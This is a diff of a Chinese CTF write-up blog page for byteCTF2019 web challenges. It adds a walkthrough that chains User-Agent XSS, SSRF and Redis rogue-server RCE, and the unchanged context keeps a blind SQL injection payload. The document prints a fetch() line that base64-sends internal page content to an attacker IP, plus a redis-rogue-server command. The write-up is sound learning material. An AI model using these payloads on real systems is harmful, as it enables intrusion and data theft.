@@ -105,30 +105,8 @@
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/cd055f3dd16af72b99bbb42b1708a92f.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/e6bc880bdbf6c588b1eb913dd40c0242.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/753a0667c74005c21b7dfc3df7b72150.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png">
-<meta property="og:updated_time" content="2020-01-22T12:46:26.547Z">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/25e34ee86507f1c45fe390137e899312.png">
+<meta property="og:updated_time" content="2020-03-13T14:15:39.166Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="byteCTF2019-web-wp">
 <meta name="twitter:description" content="九月初的比赛，当时划水了一天半，第二天后面才做了一道题">
@@ -487,8 +465,24 @@
 <p>这里记得要用html或者其它能显示的，一开始用了txt什么都显示不出来，查了别人的wp后才发现txt要下载才能看到，之前的就已经打出来了，真的傻了</p>
 <p>还有那个盲注的部分，实际上还能用这个payload进行布尔盲注<br><code>1&#39; ^ (ascii(substr((select(group_concat(table_name)) from (information_schema.tables)where table_schema=database()),1,1))&gt;200) ^ &#39;1</code><br>这个payload正确的情况下是会所有文章都改成一样，可以通过这个逻辑去判断。实际上我的那个payload当错误时也会全改，不过判断时间简单点，虽然有点久</p>
 <h2 id="icloudmusic"><a href="#icloudmusic" class="headerlink" title="icloudmusic"></a>icloudmusic</h2><p>这题唯一解的W&amp;M战队的大佬说是漏洞危害不公开wp，也没有环境分析，就先放着吧（好像是SUCTF那道改的题）</p>
-<h2 id="DOT-server-prove"><a href="#DOT-server-prove" class="headerlink" title="DOT_server_prove"></a>DOT_server_prove</h2><p>这题也是没有</p>
-<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""><br><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/db926ca2f4c0da0e53d121ef116810b2.png" alt=""></p>
+<h2 id="DOT-server-prove"><a href="#DOT-server-prove" class="headerlink" title="DOT_server_prove"></a>DOT_server_prove</h2><p>这题也没有靶机，看<a href="https://xz.aliyun.com/t/6312" target="_blank" rel="noopener">wp</a>记录几点疑问以及自己的见解</p>
+<p>首先是parse文件，放入IDA分析后</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/25e34ee86507f1c45fe390137e899312.png" alt=""></p>
+<p>大佬通过函数名就判断出了这是go的二进制文件，这个真的学不会，以后能弄到go的二进制文件再来比对看看【整完hgame那题后也许这种映引入大量库的大概率是go？</p>
+<p>然后是<code>dot server</code>，见这篇<br><a href="https://www.cnblogs.com/yjf512/p/3773196.html" target="_blank" rel="noopener">如何开发打点统计系统</a><br>就是通过nginx日志（或者通过其它方式）获得入站信息并统计</p>
+<p>接着是这条命令对nginx日志的处理<br><code>cat /tmp/test.txt | awk -F &#39; &quot;&#39; &#39;{print $NF}&#39; &gt;&gt; /tmp/data.txt ;echo &#39;&#39; &gt; /tmp/test.txt</code><br>读取<code>/tmp/test.txt</code>中的信息，然后以<code>&quot;</code>将每行分隔为多列，并取最后一列的数据写入<code>/tmp/data.txt</code>，最后清空<code>/tmp/test.txt</code></p>
+<p>而nginx日志是（access.log）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.1.1.1 - - </span><br><span class="line">[09/Feb/2019:22:41:28 +0800] &quot;GET /index.html HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
+<p>处理之后应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.1.1.1 - - </span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
+<p>剩余访问时间和UA</p>
+<p>由于可以通过查看题目的源码发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var ajax = new XMLHttpRequest();</span><br><span class="line">    ajax.open(&apos;get&apos;,&apos;http://dot.whizard.com/123&apos;);</span><br><span class="line">    ajax.send();</span><br><span class="line">    ajax.onreadystatechange = function () &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是使用这个url的UA进行XSS，通过回弹的消息的RFF得到来自8080端口</p>
+<p><code>fetch(&#39;http://127.0.0.1:8080&#39;).then(r=&gt;r.text()).then(d=&gt;{fetch(&#39;http://IP:9999/&#39;+btoa(d))})</code> </p>
+<p>访问打页面源码，提示的<code>robots.txt</code>中提示了<code>curl.php</code>，能够进行SSRF。扫描发现6379端口开着</p>
+<p>这里需要利用Redis的RCE漏洞<br><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">Redis(&lt;=5.0.5) RCE</a><br>这样执行<br><code>python3 redis-rogue-server.py --rhost=target_ip --lhost=vps_ip --exp=exp.so</code></p>
+<p>不过由于要通过XSS打，所以要抓流量，然后再通过XSS打过去。一共三段流量，第一二段之间需要停顿3秒左右保证文件同步完成</p>
 
       
     </div>
